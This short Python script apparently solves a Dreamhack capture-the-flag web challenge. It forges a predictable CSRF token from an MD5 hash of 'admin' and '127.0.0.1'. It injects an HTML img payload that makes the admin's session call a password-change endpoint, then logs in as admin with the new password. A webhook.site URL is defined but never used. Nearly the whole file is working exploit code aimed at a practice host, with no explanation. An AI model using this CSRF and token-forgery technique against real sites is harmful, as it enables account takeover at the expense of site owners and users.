import requests
from hashlib import md5

token = md5(("admin"+"127.0.0.1").encode()).hexdigest()
print(token)
url = "http://host3.dreamhack.games:11421/"
my_url = "https://webhook.site/9ceac094-1b02-4871-9dd4-049691f12bda"
payload = {"param":f'<img src="/change_password?pw=hello&csrftoken={token}">'}
res = requests.post(url+"flag",data=payload)
print(res.text)
res = requests.post(url+"login",data={"username":"admin", "password":"hello"})
print(res.text)
